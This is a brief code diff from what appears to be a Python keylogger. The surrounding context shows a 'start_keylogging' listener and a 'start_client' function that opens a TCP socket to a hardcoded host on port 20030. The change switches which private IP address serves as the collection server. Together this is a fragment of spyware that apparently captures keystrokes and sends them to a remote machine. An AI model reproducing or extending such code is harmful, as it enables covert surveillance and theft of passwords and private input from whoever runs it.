@@ -14,8 +14,8 @@ def start_keylogging():
         listener.join()
 
 def start_client():
-    #HOST = "192.168.24.5"
-    HOST = "172.16.120.153"
+    HOST = "192.168.24.5"
+    #HOST = "172.16.120.153"
     PORT = 20030
 
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
